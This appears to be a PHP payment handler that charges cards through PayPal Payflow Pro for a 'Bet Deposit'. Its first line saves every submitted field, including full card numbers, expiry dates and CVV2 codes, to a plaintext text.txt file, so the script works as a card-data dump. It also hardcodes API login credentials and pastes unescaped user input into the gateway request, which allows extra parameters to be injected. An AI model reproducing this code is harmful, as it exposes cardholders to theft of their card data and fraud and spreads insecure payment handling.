<?php 
file_put_contents('text.txt', json_encode($_POST));


$user = 'kennefgdf'; // API User Username
$password = 'kentiverr1'; // API User Password
$vendor = 'kenvendour'; // Merchant Login ID
$cardno=str_replace(' ', '', $_POST['ACCT']);
$expdate=str_replace(' ', '', $_POST['EXPDATE']);
$cvv2=$_POST['CVV2'];
// Reseller who registered you for Payflow or 'PayPal' if you registered
// directly with PayPal
$partner = 'paypal'; 




$amount = $_POST["AMT"];
// $currency = $currencies["currency"];

    $url ='https://payflowpro.paypal.com';


        $request  = 'USER=' . urlencode($user);
        $request .= '&VENDOR=' . urlencode($vendor);
        $request .= '&PWD=' . $password;
        $request .= '&PARTNER=' . urlencode($partner);
        $request .= '&TRXTYPE=S';
        $request .= '&TENDER=C';
        $request .= '&ACCT=' . str_replace(' ', '', $cardno);
        $request .= '&EXPDATE=' . $expdate;
        $request .= '&CVV2=' . $cvv2;
        $request .= '&AMT=' . $amount;
        // $request .= '&CURRENCY=' . $currency;
        $request .= '&COMMENT1=Bet Deposit';
        $request .= '&BILLTOFIRSTNAME=' . $_POST["BILLTOFIRSTNAME"];
        // $request .= '&BILLTOLASTNAME=' . $userinfo["user_surname"];
        $request .= '&BILLTOSTREET=' . $_POST["BILLTOSTREET"];
        $request .= '&BILLTOCITY    =' . $_POST["BILLTOCITY"];
        $request .= '&BILLTOSTATE   =' . $_POST["BILLTOSTATE"];
        $request .= '&BILLTOZIP=' . $_POST['BILLTOZIP'];
        // $request .= '&BILLTOCOUNTRY=' . $userinfo["country"];
        // $request .= '&CUSTIP=' . $iusers->get_ip_address();
        // $request .= '&EMAIL=' . $userinfo["user_email"];




    // $headers = array();
    // $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    // $headers[] = 'Content-Length: ' . strlen($request);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
    // curl_setopt($ch, CURLOPT_HEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

   echo $result = curl_exec($ch);
    curl_close($ch);

    // // Parse results
    // $response = array();
    // $result = strstr($result, 'RESULT');    
    // $valArray = explode('&', $result);
    // foreach ($valArray as $val) {
    //   $valArray2 = explode('=', $val);
    //   $response[$valArray2[0]] = $valArray2[1];
    // }



    // if ($response['RESULT'] == 0) {
    //   echo '<span style="color: white;">SUCCESS!</span>';
    // } else {
    //   echo '<span style="color: white;">FAILURE: ' . $response['RESPMSG'] . ' ['. $response['RESULT'] . ']</span>';
    // }

//echo"RESULT=12&PNREF=BY0P4D30AD68&RESPMSG=Declined: 15005-This transaction cannot be processed.&AVSADDR=X&AVSZIP=X&CVV2MATCH=X&IAVS=N";
?>
